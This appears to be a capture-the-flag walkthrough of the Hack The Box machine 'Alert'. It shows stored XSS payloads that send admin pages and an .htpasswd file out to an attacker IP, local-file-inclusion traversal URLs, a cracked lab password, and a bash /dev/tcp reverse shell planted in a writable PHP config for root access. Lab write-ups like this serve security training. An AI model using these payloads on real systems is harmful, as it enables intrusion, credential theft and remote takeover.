1, Recon
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
12227/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we check it from browser, we found the index page is that 
`http://alert.htb/index.php?page=alert`
![](images/Pasted%20image%2020241125075754.png)
In this page, we found a path to view markdown file.
`http://alert.htb/visualizer.php`

After check the subdomains of `alert.htb`, I found another sub-domain to need the authorization 
![](images/Pasted%20image%2020241125081208.png)

Firstly, we want to check the XSS of markdown.
Because this is a page which transfer the markdown file into html, so that means we can also apply the js into the markdown file.
So the payload would be:
```
<script>
fetch("http://alert.htb/index.php?page=messages")
.then(response => response.text()) // Convert the response to text
.then(data => {
fetch("http://10.10.16.10/?data=" + encodeURIComponent(data));
})
.catch(error => console.error("Error fetching the messages:", error));
</script>
```

firstly, catch the messages of admin, and convert to response to text and send to our local machine.
![](images/Pasted%20image%2020241125092808.png)
By using Share Markdown and send it to the Backstage from `Contact us`

Then we get 
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```
In this place, We can find the LFI vulner here 
`<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>`

So let's try to exploit it and find the valid files:
`http://alert.htb/messages.php?file=../../../../../../../etc/apache2/sites-enabled/000-default.conf`
This file contains the information of this web service.
```
<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>

```

`AuthUserFile /var/www/statistics.alert.htb/.htpasswd`
This would be our target.
payload: 
```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
.then(response => response.text()) // Convert the response to text
.then(data => {
fetch("http://10.10.16.10/?data=" + encodeURIComponent(data));
})
.catch(error => console.error("Error fetching the messages:", error));
</script>
```
Then we get the credit.
```
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
```
We need to crack this hash and then we can check the ssh or just login to `statistics.alert.htb`
Finally, we get `albert:manchesterunited`

2, shell as root
firstly, we would check what can the user do as root
```
sudo -l
[sudo] password for albert: 
Sorry, user albert may not run sudo on alert.
```

Then I would check the netstate
```
netstat -ntlp

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               
```

By forwarding this port to our localhost, we found this page
![](images/Pasted%20image%2020241125095151.png)
We found this website monitor, I think this would be run by root.
By using pspy64 to check our guess
```
CMD: UID=0    PID=999    | /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
CMD: UID=0    PID=1007   | /bin/bash /root/scripts/xss_bot.sh 
CMD: UID=0    PID=1006   | /bin/bash /root/scripts/php_bot.sh 
CMD: UID=0    PID=1005   | /bin/sh -c /root/scripts/xss_bot.sh 
CMD: UID=0    PID=1004   | /bin/sh -c /root/scripts/php_bot.sh
```

It is true, so we can check its version and exploits to help us Privilege Escalation.

By checking id
```
id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```
and in the directory of website-monitor, we find we have the chance to change config
`drwxrwxr-x 2 root management  4096 Oct 12 04:17 config`
```
cat configuration.php 
<?php
define('PATH', '/opt/website-monitor');
?>
```
Then we just need to add the reverse shell into this file, and reload the url
`http://localhost:8080`
```
<?php
define('PATH', '/opt/website-monitor');
exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.10/443 0>&1"');
?>
```
Finally, we get the reverse shell.
